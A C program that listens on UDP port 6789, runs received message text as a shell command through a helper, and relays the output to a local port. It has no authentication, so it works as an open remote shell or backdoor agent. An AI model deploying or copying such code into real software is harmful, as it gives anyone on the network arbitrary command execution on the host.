#include <stdio.h>
#include <stdlib.h>
#include "oncesend.h"
#include "utils/runcmd.h"
#include "utils/udpsocket.h"
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#define CLIENTID 1
int port=6789;
int main(int argc, char** argv) {

    int sin_len;
    char resultbuffer[MESSAGELEN];
    msg message;
    unsigned char buffer[MESSAGEIDLEN+OPTIONLEN+MESSAGELEN+3];
    int socket_descriptor;
    struct sockaddr_in sin;
    sin_len = inint__cd23(&socket_descriptor,&sin,port);
    if(sin_len <0)
    {
	exit(-1);
    }
    printf("Waiting for data form sender \n");

    while(1)
    {
        recvfrom(socket_descriptor,&buffer,sizeof(buffer),0,(struct sockaddr *)&sin,&sin_len);
	changeTomsg(buffer,&message);
	printf("[\n\tmessageid:%d%d\n",message.messageid[0],message.messageid[1]);
        printf("\trequest from server:%s",message.message);
	printf("\tclientid:%d\n",message.clientid);
        if((message.code&0x01)==1)
	{
                //request
		printf("\ttype:request\n");
                if((message.code&0x02)==2)
                {
	                cmd_system__0a40(message.message,resultbuffer,MESSAGELEN);
                        printf("\tshell:%s]\n",message.message);
                        writeMessage(&message,resultbuffer);
                        message.code = 0;
                }
                else if((message.code&0x02)==0)
                {
                       
                }

		if(isend("127.0.0.1",1024,&message)!=0)
                {
                        print_sw(DEBUG,PUTERR,"\nerror\n");
                }
	}
    }

    close(socket_descriptor);
    exit(0);

    return (EXIT_SUCCESS);
}


